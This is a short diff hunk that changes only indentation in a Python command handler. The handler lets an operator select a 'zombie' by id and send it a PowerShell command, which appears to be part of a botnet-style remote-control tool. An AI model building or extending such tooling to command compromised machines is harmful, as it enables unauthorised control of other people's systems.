@@ -19,7 +19,7 @@ def list_zombies(socket):
 
 def execute_command(socket):
 	socket.send(b'Please choose a zombie to command by specifying his id: ')
-        choice = int(socket.recv(2048).decode('utf-8'))
+	choice = int(socket.recv(2048).decode('utf-8'))
 	z = listener.zombies[choice]
 	socket.send(b'Zombie with uuid: '+z.uuid+' is selected.')
 	socket.send(b'Please enter powershell command to execute: ')
